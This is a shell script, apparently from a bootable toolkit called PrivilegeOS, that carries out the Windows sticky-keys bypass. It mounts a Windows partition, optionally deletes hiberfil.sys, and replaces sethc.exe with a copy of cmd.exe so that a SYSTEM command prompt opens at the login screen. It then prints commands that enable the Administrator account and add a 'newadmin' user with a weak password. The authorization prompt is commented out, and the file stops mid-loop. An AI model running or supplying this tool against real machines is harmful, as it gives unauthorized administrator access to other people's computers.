#!/bin/sh
#
# getadmin.sh - Windows Admin Access Script for PrivilegeOS
# This script finds Windows partitions and performs the sticky keys bypass
# WARNING: This is for educational/penetration testing purposes only!
# Updated: 2025-07-10 03:57:02 UTC

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
USE_FORCE=0
DELETE_HIBERFIL=0
CURRENT_MOUNTED_DEVICE=""

# Logging function
log() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# Help function
show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -f, --force         Use force option when mounting NTFS partitions"
    echo "  -d, --delete-hiberfil Delete hiberfil.sys if found (helps with hibernated Windows)"
    echo "  -h, --help          Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0                    # Normal operation"
    echo "  $0 --force            # Use force mount option"
    echo "  $0 --delete-hiberfil  # Delete hibernation file if found"
    echo "  $0 -f -d              # Use both force mount and delete hiberfil"
    echo ""
    echo "Note: Deleting hiberfil.sys will:"
    echo "  - Allow proper NTFS mounting of hibernated Windows systems"
    echo "  - Prevent Windows from resuming from hibernation (cold boot instead)"
    echo "  - Free up disk space (hiberfil.sys can be several GB)"
    echo ""
}

# Parse command line arguments
while [ $# -gt 0 ]; do
    case $1 in
        -f|--force)
            USE_FORCE=1
            shift
            ;;
        -d|--delete-hiberfil)
            DELETE_HIBERFIL=1
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Banner
echo -e "${CYAN}=============================================${NC}"
echo -e "${CYAN}          Windows Admin Access Tool         ${NC}"
echo -e "${CYAN}=============================================${NC}"
echo -e "${YELLOW}WARNING: This tool is for educational/penetration testing only!${NC}"
echo -e "${YELLOW}Use only on systems you own or have explicit permission to test.${NC}"
echo -e "${CYAN}=============================================${NC}"
if [ "$USE_FORCE" -eq 1 ]; then
    echo -e "${YELLOW}Force mount option: ENABLED${NC}"
else
    echo -e "${BLUE}Force mount option: DISABLED (use --force to enable)${NC}"
fi
if [ "$DELETE_HIBERFIL" -eq 1 ]; then
    echo -e "${YELLOW}Delete hiberfil.sys: ENABLED${NC}"
else
    echo -e "${BLUE}Delete hiberfil.sys: DISABLED (use --delete-hiberfil to enable)${NC}"
fi
echo -e "${BLUE}Updated: 2025-07-10 03:57:02 UTC${NC}"
echo -e "${BLUE}User: ktauchathuranga${NC}"
echo ""

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    error "This script must be run as root!"
    exit 1
fi

# Check if NTFS3 is available
if ! grep -q ntfs3 /proc/filesystems; then
    error "NTFS3 filesystem support is not available in the kernel!"
    error "Please ensure the kernel was compiled with NTFS3 support."
    exit 1
fi

# Create mount point
MOUNT_POINT="/mnt/windows_check"
mkdir -p "$MOUNT_POINT"

# Function to safely unmount
safe_unmount() {
    local device_to_unmount="$1"
    
    # If no device specified, use the current mounted device
    if [ -z "$device_to_unmount" ]; then
        device_to_unmount="$CURRENT_MOUNTED_DEVICE"
    fi
    
    # Check if we have a device to unmount
    if [ -n "$device_to_unmount" ]; then
        log "Unmounting device: $device_to_unmount"
        
        # Force sync before unmounting
        sync
        sleep 2
        
        # Try multiple unmount methods
        if umount "$device_to_unmount" 2>/dev/null; then
            success "Successfully unmounted $device_to_unmount"
        elif umount "$MOUNT_POINT" 2>/dev/null; then
            success "Successfully unmounted via mount point"
        elif umount -l "$device_to_unmount" 2>/dev/null; then
            success "Lazy unmount successful for $device_to_unmount"
        elif umount -f "$device_to_unmount" 2>/dev/null; then
            success "Force unmount successful for $device_to_unmount"
        else
            error "Could not unmount $device_to_unmount"
            warning "Trying alternative methods..."
            
            # Show what's mounted
            log "Current mounts:"
            grep "$MOUNT_POINT\|$device_to_unmount" /proc/mounts 2>/dev/null || true
            
            # Kill any processes using the mount point
            if command -v fuser >/dev/null 2>&1; then
                log "Killing processes using the mount point..."
                fuser -km "$MOUNT_POINT" 2>/dev/null || true
                sleep 1
                
                # Try unmount again
                if umount "$device_to_unmount" 2>/dev/null; then
                    success "Successfully unmounted after killing processes"
                else
                    error "Still could not unmount $device_to_unmount"
                    return 1
                fi
            else
                return 1
            fi
        fi
        
        # Additional sync after unmount
        sync
        sleep 1
        
        # Clear the current mounted device
        CURRENT_MOUNTED_DEVICE=""
    else
        info "No device to unmount"
    fi
    
    return 0
}

# Function to handle hibernation file
handle_hibernation_file() {
    local partition="$1"
    
    # Check if hibernation file exists
    if [ -f "$MOUNT_POINT/hiberfil.sys" ]; then
        HIBERFIL_SIZE=$(stat -c%s "$MOUNT_POINT/hiberfil.sys" 2>/dev/null)
        HIBERFIL_SIZE_MB=$((HIBERFIL_SIZE / 1024 / 1024))
        
        warning "Hibernation file detected:"
        warning "- File: $MOUNT_POINT/hiberfil.sys"
        warning "- Size: $HIBERFIL_SIZE_MB MB"
        warning "- This indicates Windows was hibernated, not shut down"
        
        if [ "$DELETE_HIBERFIL" -eq 1 ]; then
            echo ""
            echo -e "${YELLOW}Preparing to delete hiberfil.sys...${NC}"
            echo -e "${RED}WARNING: This will prevent Windows from resuming hibernation!${NC}"
            echo -e "${RED}Windows will perform a cold boot instead of resuming.${NC}"
            echo -e "${YELLOW}This is generally safe but any unsaved work will be lost.${NC}"
            echo ""
            echo -e "${YELLOW}Delete hiberfil.sys ($HIBERFIL_SIZE_MB MB)? (Type 'YES' to confirm): ${NC}"
            read -r CONFIRM_DELETE
            
            if [ "$CONFIRM_DELETE" = "YES" ]; then
                log "Deleting hiberfil.sys..."
                
                # Show before deletion
                log "Before deletion:"
                ls -la "$MOUNT_POINT/hiberfil.sys" 2>/dev/null
                
                # Try multiple deletion methods
                DELETED=0
                
                # Method 1: Simple rm
                if rm "$MOUNT_POINT/hiberfil.sys" 2>/dev/null; then
                    DELETED=1
                    success "hiberfil.sys deleted with rm command"
                elif rm -f "$MOUNT_POINT/hiberfil.sys" 2>/dev/null; then
                    DELETED=1
                    success "hiberfil.sys deleted with rm -f command"
                elif rm -rf "$MOUNT_POINT/hiberfil.sys" 2>/dev/null; then
                    DELETED=1
                    success "hiberfil.sys deleted with rm -rf command"
                else
                    error "Failed to delete hiberfil.sys with rm commands"
                    
                    # Method 2: Try with different attributes
                    log "Trying to remove file attributes..."
                    if command -v chattr >/dev/null 2>&1; then
                        chattr -i "$MOUNT_POINT/hiberfil.sys" 2>/dev/null || true
                        chattr -a "$MOUNT_POINT/hiberfil.sys" 2>/dev/null || true
                        if rm -f "$MOUNT_POINT/hiberfil.sys" 2>/dev/null; then
                            DELETED=1
                            success "hiberfil.sys deleted after removing attributes"
                        fi
                    fi
                fi
                
                if [ $DELETED -eq 1 ]; then
                    # Verify deletion
                    log "Verifying deletion..."
                    if [ ! -f "$MOUNT_POINT/hiberfil.sys" ]; then
                        success "Verification: hiberfil.sys is no longer present"
                        success "Freed up $HIBERFIL_SIZE_MB MB of disk space"
                    else
                        error "Verification failed: hiberfil.sys still exists!"
                        log "File still exists after deletion attempt:"
                        ls -la "$MOUNT_POINT/hiberfil.sys" 2>/dev/null
                        return 1
                    fi
                    
                    # Force sync after deletion
                    sync
                    sleep 3
                    sync
                    
                    success "Hibernation file successfully removed - continuing with bypass..."
                    return 0
                else
                    error "Failed to delete hiberfil.sys with all methods"
                    warning "You may need to:"
                    warning "1. Boot Windows normally and disable hibernation"
                    warning "2. Use a different tool to delete the file"
                    warning "3. Try mounting with different options"
                    return 1
                fi
            else
                warning "Skipping hiberfil.sys deletion"
                info "You can use --delete-hiberfil option to delete it automatically"
                return 1
            fi
        else
            echo ""
            echo -e "${YELLOW}Recommended actions:${NC}"
            echo -e "${YELLOW}1. Use --delete-hiberfil option to delete the hibernation file${NC}"
            echo -e "${YELLOW}2. Or use --force option to force mount the hibernated filesystem${NC}"
            echo -e "${YELLOW}3. Or boot Windows normally first, then shut down properly${NC}"
            echo -e "${YELLOW}4. Or manually delete: rm -rf $MOUNT_POINT/hiberfil.sys${NC}"
            echo ""
            return 1
        fi
    else
        info "No hibernation file found - Windows was shut down properly"
        return 0
    fi
}

# Function to try mounting with different options
try_mount() {
    local partition="$1"
    local mode="$2"  # "ro" or "rw"
    
    # First ensure mount point is clean
    safe_unmount
    
    # Build mount options
    local mount_opts="$mode"
    if [ "$USE_FORCE" -eq 1 ]; then
        mount_opts="$mount_opts,force"
    fi
    
    # Try to mount
    log "Attempting to mount $partition with NTFS3 ($mount_opts)..."
    if mount -t ntfs3 -o "$mount_opts" "$partition" "$MOUNT_POINT" 2>/dev/null; then
        success "Successfully mounted $partition with options: $mount_opts"
        # Store the currently mounted device
        CURRENT_MOUNTED_DEVICE="$partition"
        return 0
    else
        # If normal mount fails, try with additional options
        if [ "$USE_FORCE" -eq 0 ]; then
            warning "Normal mount failed, trying with force option..."
            if mount -t ntfs3 -o "$mode,force" "$partition" "$MOUNT_POINT" 2>/dev/null; then
                success "Successfully mounted $partition with force option"
                # Store the currently mounted device
                CURRENT_MOUNTED_DEVICE="$partition"
                return 0
            fi
        fi
        error "Failed to mount $partition"
        return 1
    fi
}

# Function to check if partition is Windows
check_windows_partition() {
    local partition="$1"
    
    log "Checking partition: $partition"
    
    # Try to mount the partition with NTFS3
    if try_mount "$partition" "rw"; then  # Mount as read-write from the start
        # Check for hibernation file first
        handle_hibernation_file "$partition"
        HIBERNATION_EXIT_CODE=$?
        
        # If hibernation file handling failed but we want to continue anyway
        if [ $HIBERNATION_EXIT_CODE -ne 0 ]; then
            if [ "$USE_FORCE" -eq 1 ]; then
                warning "Hibernation file handling failed, but continuing with --force option"
            else
                info "Hibernation file handling failed - this partition may not be accessible"
                safe_unmount "$partition"
                return 1
            fi
        fi
        
        # Check for Windows directory structure
        if [ -d "$MOUNT_POINT/Windows" ]; then
            log "Found Windows directory"
            if [ -d "$MOUNT_POINT/Windows/System32" ]; then
                log "Found System32 directory"
                
                # Check for critical files
                if [ -f "$MOUNT_POINT/Windows/System32/sethc.exe" ] && [ -f "$MOUNT_POINT/Windows/System32/cmd.exe" ]; then
                    success "Found Windows partition at $partition!"
                    success "- sethc.exe: FOUND"
                    success "- cmd.exe: FOUND"
                    
                    # Show file details
                    log "File details:"
                    ls -la "$MOUNT_POINT/Windows/System32/sethc.exe" 2>/dev/null
                    ls -la "$MOUNT_POINT/Windows/System32/cmd.exe" 2>/dev/null
                    
                    # DON'T UNMOUNT HERE - we found the partition and want to continue
                    return 0
                else
                    warning "Windows partition found but missing required files:"
                    [ ! -f "$MOUNT_POINT/Windows/System32/sethc.exe" ] && warning "- sethc.exe: MISSING"
                    [ ! -f "$MOUNT_POINT/Windows/System32/cmd.exe" ] && warning "- cmd.exe: MISSING"
                fi
            else
                info "Windows directory found but no System32 directory"
            fi
        else
            info "Partition mounted but no Windows directory found"
        fi
        
        safe_unmount "$partition"
        return 1
    else
        info "Failed to mount $partition with NTFS3"
        return 1
    fi
}

show_legal_warning() {
    echo -e "${RED}=============================================${NC}"
    echo -e "${RED}            LEGAL WARNING                    ${NC}"
    echo -e "${RED}=============================================${NC}"
    echo -e "${YELLOW}This tool is for AUTHORIZED testing only!${NC}"
    echo -e "${YELLOW}Unauthorized use may violate laws including:${NC}"
    echo -e "${YELLOW}- Computer Fraud and Abuse Act (USA)${NC}"
    echo -e "${YELLOW}- Computer Misuse Act (UK)${NC}"
    echo -e "${YELLOW}- Criminal Code (Canada)${NC}"
    echo -e "${YELLOW}- Local cybercrime laws${NC}"
    echo ""
    echo -e "${RED}Do you have WRITTEN AUTHORIZATION to test this system?${NC}"
    echo -e "${YELLOW}Type 'I-HAVE-AUTHORIZATION' to continue: ${NC}"
    read -r LEGAL_CONFIRM
    
    if [ "$LEGAL_CONFIRM" != "I-HAVE-AUTHORIZATION" ]; then
        echo -e "${RED}Operation cancelled - No authorization confirmed${NC}"
        echo -e "${YELLOW}Only use on systems you own or have explicit permission to test${NC}"
        exit 1
    fi
}

# Function to perform the sticky keys bypass
perform_bypass() {
    local partition="$1"
    
    echo ""
    echo -e "${CYAN}=============================================${NC}"
    echo -e "${CYAN}      Performing Sticky Keys Bypass        ${NC}"
    echo -e "${CYAN}=============================================${NC}"
    
    # Check if partition is already mounted from the detection phase
    if [ "$CURRENT_MOUNTED_DEVICE" = "$partition" ] && grep -q "$MOUNT_POINT" /proc/mounts; then
        log "Partition is already mounted from detection phase"
        
        # Check if it's mounted read-only and remount as read-write if needed
        MOUNT_OPTIONS=$(grep "$MOUNT_POINT" /proc/mounts | awk '{print $4}')
        if echo "$MOUNT_OPTIONS" | grep -q "ro"; then
            log "Partition is mounted read-only, remounting as read-write..."
            safe_unmount "$partition"
            if ! try_mount "$partition" "rw"; then
                error "Failed to remount $partition as read-write!"
                return 1
            fi
        else
            log "Partition is already mounted read-write"
        fi
    else
        # Mount as read-write
        log "Mounting $partition as read-write..."
        if ! try_mount "$partition" "rw"; then
            error "Failed to mount $partition as read-write!"
            if [ "$USE_FORCE" -eq 0 ]; then
                error "Try running with --force option"
            fi
            return 1
        fi
    fi
    
    # Check for hibernation file again in read-write mode
    if [ -f "$MOUNT_POINT/hiberfil.sys" ] && [ "$DELETE_HIBERFIL" -eq 0 ]; then
        warning "Hibernation file still present. This may cause issues."
        warning "Consider using --delete-hiberfil option"
    fi
    
    # Navigate to System32
    SYSTEM32_PATH="$MOUNT_POINT/Windows/System32"
    cd "$SYSTEM32_PATH" || {
        error "Could not navigate to System32 directory!"
        safe_unmount "$partition"
        return 1
    }
    
    log "Current directory: $(pwd)"
    
    # Show current file status
    log "Current file status:"
    ls -la sethc.exe cmd.exe 2>/dev/null || {
        error "Could not list required files!"
        safe_unmount "$partition"
        return 1
    }
    
    # Check if files exist
    if [ ! -f "sethc.exe" ]; then
        error "sethc.exe not found in System32!"
        safe_unmount "$partition"
        return 1
    fi
    
    if [ ! -f "cmd.exe" ]; then
        error "cmd.exe not found in System32!"
        safe_unmount "$partition"
        return 1
    fi
    
    # Get file sizes for verification
    SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
    CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
    
    log "Original file sizes:"
    log "- sethc.exe: $SETHC_SIZE bytes"
    log "- cmd.exe: $CMD_SIZE bytes"
    
    # Check file permissions and fix if needed
    log "Checking and fixing file permissions..."
    chmod 755 "sethc.exe" 2>/dev/null || warning "Could not change sethc.exe permissions"
    chmod 755 "cmd.exe" 2>/dev/null || warning "Could not change cmd.exe permissions"
    
    # Force sync before operations
    sync
    sleep 2
    
    # Create backups of both files with comprehensive verification
    log "Creating backups of original files..."
    
    # Backup sethc.exe with verification
    if [ ! -f "sethc.exe.backup" ]; then
        log "Creating backup of sethc.exe..."
        if cp "sethc.exe" "sethc.exe.backup"; then
            # Force sync to ensure write completion
            sync
            sleep 1
            
            # Verify backup was actually created
            if [ -f "sethc.exe.backup" ]; then
                # Verify backup size matches original
                ORIGINAL_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
                BACKUP_SIZE=$(stat -c%s "sethc.exe.backup" 2>/dev/null)
                
                if [ "$BACKUP_SIZE" -eq "$ORIGINAL_SIZE" ] && [ "$BACKUP_SIZE" -gt 0 ]; then
                    success "Backup created: sethc.exe.backup ($BACKUP_SIZE bytes)"
                    success "Backup verification: Size matches original"
                    
                    # Additional integrity check - compare first few bytes
                    if cmp -n 100 "sethc.exe" "sethc.exe.backup" >/dev/null 2>&1; then
                        success "Backup verification: Content integrity confirmed"
                    else
                        error "Backup verification failed: Content mismatch!"
                        rm -f "sethc.exe.backup" 2>/dev/null
                        safe_unmount "$partition"
                        return 1
                    fi
                else
                    error "Backup verification failed: Size mismatch!"
                    error "Original: $ORIGINAL_SIZE bytes, Backup: $BACKUP_SIZE bytes"
                    rm -f "sethc.exe.backup" 2>/dev/null
                    safe_unmount "$partition"
                    return 1
                fi
            else
                error "Backup verification failed: sethc.exe.backup not found after creation!"
                safe_unmount "$partition"
                return 1
            fi
        else
            error "Failed to create backup of sethc.exe!"
            safe_unmount "$partition"
            return 1
        fi
    else
        warning "Backup already exists: sethc.exe.backup"
        info "Verifying existing backup..."
        
        # Verify existing backup
        if [ -f "sethc.exe.backup" ]; then
            ORIGINAL_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
            EXISTING_BACKUP_SIZE=$(stat -c%s "sethc.exe.backup" 2>/dev/null)
            
            log "Original sethc.exe size: $ORIGINAL_SIZE bytes"
            log "Existing backup size: $EXISTING_BACKUP_SIZE bytes"
            
            if [ "$EXISTING_BACKUP_SIZE" -gt 0 ]; then
                success "Existing backup appears valid ($EXISTING_BACKUP_SIZE bytes)"
            else
                error "Existing backup appears corrupted (0 bytes)!"
                safe_unmount "$partition"
                return 1
            fi
        else
            error "Backup file listed as existing but not found!"
            safe_unmount "$partition"
            return 1
        fi
    fi
    
    # Backup cmd.exe with verification (optional but recommended)
    if [ ! -f "cmd.exe.backup" ]; then
        log "Creating backup of cmd.exe..."
        if cp "cmd.exe" "cmd.exe.backup"; then
            # Force sync to ensure write completion
            sync
            sleep 1
            
            # Verify backup was actually created
            if [ -f "cmd.exe.backup" ]; then
                # Verify backup size matches original
                CMD_ORIGINAL_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
                CMD_BACKUP_SIZE=$(stat -c%s "cmd.exe.backup" 2>/dev/null)
                
                if [ "$CMD_BACKUP_SIZE" -eq "$CMD_ORIGINAL_SIZE" ] && [ "$CMD_BACKUP_SIZE" -gt 0 ]; then
                    success "Backup created: cmd.exe.backup ($CMD_BACKUP_SIZE bytes)"
                    success "Backup verification: Size matches original"
                    
                    # Additional integrity check - compare first few bytes
                    if cmp -n 100 "cmd.exe" "cmd.exe.backup" >/dev/null 2>&1; then
                        success "Backup verification: Content integrity confirmed"
                    else
                        warning "cmd.exe backup content mismatch (non-critical)"
                    fi
                else
                    warning "cmd.exe backup size mismatch (non-critical)"
                    warning "Original: $CMD_ORIGINAL_SIZE bytes, Backup: $CMD_BACKUP_SIZE bytes"
                fi
            else
                warning "cmd.exe backup creation failed - file not found after copy (non-critical)"
            fi
        else
            warning "Failed to create backup of cmd.exe (non-critical)"
        fi
    else
        info "cmd.exe backup already exists"
        
        # Verify existing cmd.exe backup
        if [ -f "cmd.exe.backup" ]; then
            CMD_ORIGINAL_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
            CMD_EXISTING_BACKUP_SIZE=$(stat -c%s "cmd.exe.backup" 2>/dev/null)
            
            log "Original cmd.exe size: $CMD_ORIGINAL_SIZE bytes"
            log "Existing cmd.exe backup size: $CMD_EXISTING_BACKUP_SIZE bytes"
            
            if [ "$CMD_EXISTING_BACKUP_SIZE" -gt 0 ]; then
                success "Existing cmd.exe backup appears valid ($CMD_EXISTING_BACKUP_SIZE bytes)"
            else
                warning "Existing cmd.exe backup appears corrupted (0 bytes)"
            fi
        fi
    fi
    
    # Perform the file replacement with extensive verification
    log "Performing file replacement with verification..."
    
    # Step 1: Remove original sethc.exe with verification
    log "Step 1: Removing original sethc.exe..."
    
    # First, verify the file exists
    if [ ! -f "sethc.exe" ]; then
        error "sethc.exe not found before removal!"
        safe_unmount "$partition"
        return 1
    fi
    
    # Store original size for verification
    ORIGINAL_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
    log "Original sethc.exe size before removal: $ORIGINAL_SETHC_SIZE bytes"
    
    if rm "sethc.exe"; then
        # Force sync to ensure deletion is committed
        sync
        sleep 1
        
        # Verify removal was successful
        if [ ! -f "sethc.exe" ]; then
            success "Original sethc.exe removed successfully"
            success "Verification: sethc.exe no longer exists"
            
            # Double-check by trying to stat the file
            if stat "sethc.exe" >/dev/null 2>&1; then
                error "Verification failed: sethc.exe still accessible after removal!"
                safe_unmount "$partition"
                return 1
            else
                success "Double verification: sethc.exe completely removed"
            fi
        else
            error "Verification failed: sethc.exe still exists after removal!"
            # Show file details for debugging
            log "File still present:"
            ls -la "sethc.exe" 2>/dev/null
            safe_unmount "$partition"
            return 1
        fi
    else
        error "Failed to remove original sethc.exe!"
        # Show file permissions for debugging
        log "File permissions:"
        ls -la "sethc.exe" 2>/dev/null
        safe_unmount "$partition"
        return 1
    fi
    
    # Step 2: Copy cmd.exe to sethc.exe with verification
    log "Step 2: Copying cmd.exe to sethc.exe (creating bypass)..."
    
    # First, verify cmd.exe exists and get its size
    if [ ! -f "cmd.exe" ]; then
        error "cmd.exe not found for copying!"
        # Try to restore from backup
        warning "Attempting to restore sethc.exe from backup..."
        cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
        safe_unmount "$partition"
        return 1
    fi
    
    CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
    log "cmd.exe size: $CMD_SIZE bytes"
    
    if cp "cmd.exe" "sethc.exe"; then
        # Force sync to ensure copy is committed
        sync
        sleep 1
        
        # Verify copy was successful
        if [ -f "sethc.exe" ]; then
            success "cmd.exe copied to sethc.exe successfully"
            
            # Verify size matches
            NEW_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
            
            if [ "$NEW_SETHC_SIZE" -eq "$CMD_SIZE" ]; then
                success "Size verification: sethc.exe now has cmd.exe size ($NEW_SETHC_SIZE bytes)"
                success "BYPASS ACTIVE: Shift+Shift+Shift+Shift+Shift will launch CMD"
                
                # Additional integrity check - compare content
                if cmp "cmd.exe" "sethc.exe" >/dev/null 2>&1; then
                    success "Content verification: sethc.exe is identical to cmd.exe"
                else
                    error "Content verification failed: Files differ!"
                    # Try to restore from backup
                    warning "Attempting to restore from backup..."
                    cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
                    safe_unmount "$partition"
                    return 1
                fi
                
                # Verify file permissions
                SETHC_PERMS=$(stat -c%a "sethc.exe" 2>/dev/null)
                CMD_PERMS=$(stat -c%a "cmd.exe" 2>/dev/null)
                log "sethc.exe permissions: $SETHC_PERMS"
                log "cmd.exe permissions: $CMD_PERMS"
                
                # Set appropriate permissions if needed
                if [ "$SETHC_PERMS" != "755" ]; then
                    log "Fixing sethc.exe permissions..."
                    if chmod 755 "sethc.exe"; then
                        success "Permissions set to 755"
                    else
                        warning "Could not set permissions (may still work)"
                    fi
                fi
                
            else
                error "Size verification failed: sethc.exe size mismatch!"
                error "Expected: $CMD_SIZE bytes, Got: $NEW_SETHC_SIZE bytes"
                # Try to restore from backup
                warning "Attempting to restore from backup..."
                cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
                safe_unmount "$partition"
                return 1
            fi
        else
            error "Verification failed: sethc.exe not found after copy!"
            # Try to restore from backup
            warning "Attempting to restore from backup..."
            cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
            safe_unmount "$partition"
            return 1
        fi
    else
        error "Failed to copy cmd.exe to sethc.exe!"
        # Try to restore from backup
        warning "Attempting to restore from backup..."
        cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
        safe_unmount "$partition"
        return 1
    fi
    
    # Step 3: Verify cmd.exe remains unchanged
    log "Step 3: Verifying cmd.exe remains unchanged..."
    
    FINAL_CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
    
    if [ "$FINAL_CMD_SIZE" -eq "$CMD_SIZE" ]; then
        success "cmd.exe verification: Remains unchanged ($FINAL_CMD_SIZE bytes)"
        success "Windows will function normally with legitimate cmd.exe"
    else
        warning "cmd.exe size changed unexpectedly!"
        warning "Original: $CMD_SIZE bytes, Current: $FINAL_CMD_SIZE bytes"
        
        # If we have a backup, offer to restore it
        if [ -f "cmd.exe.backup" ]; then
            warning "cmd.exe backup available for restoration if needed"
        fi
    fi
    
    # Force extensive sync
    log "Forcing filesystem sync..."
    sync
    sleep 2
    sync
    sleep 2
    
    # Verify the operation
    log "Verifying bypass operation..."
    log "Final file listing:"
    ls -la sethc.exe cmd.exe sethc.exe.backup cmd.exe.backup 2>/dev/null
    
    # Check final file sizes
    FINAL_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
    FINAL_CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
    
    log "Final file sizes:"
    log "- sethc.exe: $FINAL_SETHC_SIZE bytes (was $SETHC_SIZE, now should be $CMD_SIZE)"
    log "- cmd.exe: $FINAL_CMD_SIZE bytes (unchanged: $CMD_SIZE)"
    
    # Verify the bypass worked by checking file sizes
    if [ "$FINAL_SETHC_SIZE" -eq "$CMD_SIZE" ]; then
        success "Bypass verification: sethc.exe now has cmd.exe size - SUCCESS!"
        success "Pressing Shift 5x at Windows login will launch CMD prompt"
    else
        error "Bypass verification: sethc.exe size mismatch - FAILED!"
        warning "Expected: $CMD_SIZE bytes, Got: $FINAL_SETHC_SIZE bytes"
        safe_unmount "$partition"
        return 1
    fi
    
    if [ "$FINAL_CMD_SIZE" -eq "$CMD_SIZE" ]; then
        success "cmd.exe verification: remains original size - SUCCESS!"
        success "Windows will function normally with legitimate cmd.exe"
    else
        warning "cmd.exe size verification unexpected"
    fi
    
    # Final verification - check if sethc.exe is actually cmd.exe
    if [ -f "sethc.exe" ]; then
        success "sethc.exe is present"
        
        # Try to detect if it's actually cmd.exe by checking for CMD signature
        if command -v strings >/dev/null 2>&1; then
            if strings "sethc.exe" | grep -q "Microsoft Windows" && strings "sethc.exe" | grep -q -i "cmd\|command"; then
                success "sethc.exe contains CMD signatures - bypass likely successful!"
            else
                warning "Could not verify CMD signatures in sethc.exe"
            fi
        else
            info "strings command not available, skipping signature verification"
        fi
    else
        error "sethc.exe is missing after operation!"
        safe_unmount "$partition"
        return 1
    fi
    
    # Final sync before unmounting
    log "Final sync before unmounting..."
    sync
    sleep 3
    sync
    
    success "Sticky keys bypass completed!"
    echo ""
    echo -e "${GREEN}=============================================${NC}"
    echo -e "${GREEN}           BYPASS COMPLETED!                ${NC}"
    echo -e "${GREEN}=============================================${NC}"
    echo ""
    echo -e "${YELLOW}IMPORTANT: Please verify the bypass worked:${NC}"
    echo -e "${YELLOW}1. Use poweroff command to shutdown PrivilegeOS${NC}"
    echo -e "${YELLOW}2. Boot Windows normally${NC}"
    if [ "$DELETE_HIBERFIL" -eq 1 ]; then
        echo -e "${YELLOW}3. Windows will perform a cold boot (no hibernation resume)${NC}"
    fi
    echo -e "${YELLOW}4. At the login screen, press Shift key 5 times${NC}"
    echo -e "${YELLOW}5. If you see CMD prompt instead of sticky keys, SUCCESS!${NC}"
    echo -e "${YELLOW}6. cmd.exe will work normally throughout Windows${NC}"
    echo ""
    echo -e "${CYAN}Commands to use in the CMD prompt:${NC}"
    echo -e "${CYAN}- net user administrator /active:yes${NC}"
    echo -e "${CYAN}- net user newadmin password123 /add${NC}"
    echo -e "${CYAN}- net localgroup administrators newadmin /add${NC}"
    echo ""
    echo -e "${RED}To restore (if needed):${NC}"
    echo -e "${RED}1. Boot back into PrivilegeOS${NC}"
    echo -e "${RED}2. Run putadmin command${NC}"
    echo ""
    
    # Final unmount - go back to root directory first
    log "Unmounting Windows partition..."
    cd / || true
    safe_unmount "$partition"
    return 0
}

# Function to handle post-completion actions
handle_completion() {
    # Cleanup first
    rmdir "$MOUNT_POINT" 2>/dev/null || true
    
    echo ""
    echo -e "${CYAN}=============================================${NC}"
    echo -e "${CYAN}              SCRIPT COMPLETED              ${NC}"
    echo -e "${CYAN}=============================================${NC}"
    echo ""
    echo -e "${CYAN}=============================================${NC}"
    echo -e "${CYAN}          POST-COMPLETION OPTIONS           ${NC}"
    echo -e "${CYAN}=============================================${NC}"
    echo ""
    echo -e "${GREEN}The Windows admin bypass has been successfully completed!${NC}"
    echo ""
    echo -e "${YELLOW}Next steps:${NC}"
    echo -e "${YELLOW}1. You should now power off PrivilegeOS${NC}"
    echo -e "${YELLOW}2. Boot into Windows to test the bypass${NC}"
    echo -e "${YELLOW}3. At the Windows login screen, press Shift 5 times${NC}"
    echo -e "${YELLOW}4. You should see a CMD prompt with SYSTEM privileges${NC}"
    echo ""
    echo -e "${CYAN}Would you like to power off the system now?${NC}"
    echo -e "${BLUE}Press ENTER to power off, or type 'n'/'no' to exit to shell: ${NC}"
    
    # Read user input
    read -r POWER_CHOICE
    
    case "$POWER_CHOICE" in
        ""|"y"|"Y"|"yes"|"YES"|"Yes")
            echo ""
            echo -e "${GREEN}Powering off the system...${NC}"
            echo -e "${YELLOW}After shutdown, remove the USB drive and boot Windows normally.${NC}"
            echo -e "${YELLOW}Remember to test the bypass at the login screen (Shift x5).${NC}"
            echo ""
            
            # Give user a moment to read the message
            sleep 3
            
            # Sync and power off
            sync
            sync
            poweroff
            ;;
        "n"|"N"|"no"|"NO"|"No")
            echo ""
            echo -e "${GREEN}Returning to shell...${NC}"
            echo -e "${YELLOW}You can manually power off later with: poweroff${NC}"
            echo -e "${YELLOW}Or reboot with: reboot${NC}"
            echo ""
            ;;
        *)
            echo ""
            echo -e "${YELLOW}Invalid choice. Returning to shell...${NC}"
            echo -e "${YELLOW}You can manually power off later with: poweroff${NC}"
            echo -e "${YELLOW}Or reboot with: reboot${NC}"
            echo ""
            ;;
    esac
}

# Main execution starts here...
# Showing legal warning
#show_legal_warning

log "Starting Windows partition scan..."

# Get all partitions from /proc/partitions
PARTITIONS=""
log "Reading partition information from /proc/partitions..."

# Parse /proc/partitions to get device names
while IFS= read -r line; do
    # Skip header and empty lines
    echo "$line" | grep -q "major\|^$" && continue
    
    # Extract device name (4th column)
    device=$(echo "$line" | awk '{print $4}')
    
    # Skip if device name is empty
